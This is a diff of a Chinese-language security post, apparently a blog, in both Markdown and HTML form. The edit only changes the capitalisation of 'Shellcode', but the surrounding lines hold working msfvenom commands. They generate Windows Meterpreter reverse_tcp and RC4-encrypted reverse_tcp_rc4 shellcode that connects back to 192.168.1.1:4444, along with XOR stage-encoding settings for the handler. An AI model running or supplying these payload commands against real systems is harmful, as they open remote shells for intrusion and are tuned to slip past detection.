@@ -35,13 +35,13 @@ set StageEncoder x86/xor_dynamic
 set StageEncodingFallback false
 ```
 
-生成 Shellcode.
+生成 shellcode.
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 EnableStageEncoding=true StageEncoder=x86/xor_dynamic StageEncodingFallback=false -f c -o shellcode.c
 ```
 
-或是直接生成通过 rc4 加密流量的 Shellcode.
+或是直接生成通过 rc4 加密流量的 shellcode.
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.1.1 LPORT=4444 RC4PASSWORD=exp10it -f c -o shellcode.c
@@ -59,12 +59,12 @@ set StageEncoder x86/xor_dynamic
 set StageEncodingFallback false
 </code></pre>
 
-<p>生成 Shellcode.</p>
+<p>生成 shellcode.</p>
 
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 EnableStageEncoding=true StageEncoder=x86/xor_dynamic StageEncodingFallback=false -f c -o shellcode.c
 </code></pre>
 
-<p>或是直接生成通过 rc4 加密流量的 Shellcode.</p>
+<p>或是直接生成通过 rc4 加密流量的 shellcode.</p>
 
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.1.1 LPORT=4444 RC4PASSWORD=exp10it -f c -o shellcode.c
 </code></pre>
